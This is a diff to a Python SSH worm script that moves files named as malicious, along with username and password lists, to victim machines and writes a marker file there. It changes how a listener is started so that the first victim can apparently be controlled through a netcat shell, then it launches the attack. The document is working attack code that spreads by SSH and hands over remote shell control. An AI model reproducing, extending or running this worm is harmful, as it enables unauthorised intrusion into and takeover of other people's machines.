@@ -10,7 +10,9 @@ import sys
 import argparse
 from SSHConnection import SSHConnection
 from SSHConnection import get_local_ip
-import control
+from sys import executable
+from subprocess import call
+import time
 
 def transfer_file(worm, malicious_file):
     """ Transfers a malicious file, must be in same directory as current script """
@@ -55,7 +57,7 @@ def main():
         transfer_file(worm, "SSHConnection.py")
         transfer_file(worm, username_file)
         transfer_file(worm, password_file)
-        print ("[+] Completed! Launching local attack now...")
+        print ("[+] Completed! Launching listener now...")
         worm.ssh_connection.exec_command("echo " + get_local_ip() + " >> " + marker_file)
         """
         Steps (Needs to be in this order)
@@ -64,14 +66,12 @@ def main():
         3. getvictipIP uses recieved to run netcat and control first victim thorugh shell
         """
         try:
-            control.startlistener()
+            call(['lxterminal','-e','python control.py'])
         except Exception as nothostcomputer:
             pass
+        print ("[+] Completed! Launching local attack now...")
+        #time.sleep(10)
         launch_attack(worm, malicious_file)
-        try:
-            control.getvictimip();
-        except Exception as nothostcomputer:
-            pass
     else:
         print (" :( No target found, better get a job! ")
 
